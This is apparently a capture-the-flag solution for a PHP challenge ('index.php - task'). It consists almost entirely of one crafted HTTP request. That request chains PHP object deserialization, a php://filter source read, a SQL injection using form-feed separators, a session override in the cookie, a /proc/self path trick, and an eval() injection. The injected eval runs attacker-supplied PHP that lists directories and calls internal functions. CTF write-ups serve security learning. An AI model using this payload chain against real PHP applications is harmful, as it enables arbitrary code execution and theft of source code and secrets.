index.php - task

Solution here
```
POST //?first=pickle_rick&second=aycdlxebpbba&third=/dev/fd/11&fourth=O:%2b17:"injection_chambre":3:{s:5:"sprue";s:4:"pass";s:11:"mold_plate1";N;s:11:"mold_plate2";R:3;}&sixth=php://filter/convert.quoted-printable-encode/resource=ricksecret/db.php&sixth.second=R1cKs_Ung3s5b4L3_P45sw0Rd&seventh=!union%0cselect%0c"th3sm4rt3s7"%0cunion%0cselect%0c"'%0cor%0c1;--%0c"%0climit%0c1,1&eigth=a HTTP/1.1
Host: poseidonchalls.westeurope.cloudapp.azure.com:20000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=1sgk03g5tf3uqepuct3hhqej52; _SESSION[is_rick]=true; a=eval($_POST['fff'])%3b;
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1516

fifth=///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////proc/self/cmdline&nineth=};eval($a);{&fff=function getDirContents($dir, %26$results = array()) {
    $files = scandir($dir);

    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
            $results[] = $path; //echo file_get_contents($path);
        } else if ($value != "." %26%26 $value != "..") {
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
};
//var_dump(getDirContents('/usr/local/'));
//var_dump(scandir('/usr/lib/'));
//var_dump($dbms->query("SELECT * from top_secrets")->fetch_assoc());
//phpinfo();
//echo file_get_contents('/proc/self/maps');
//var_dump(get_loaded_extensions());
echo pickle2rick();
var_dump(get_extension_funcs('rickshit'));
```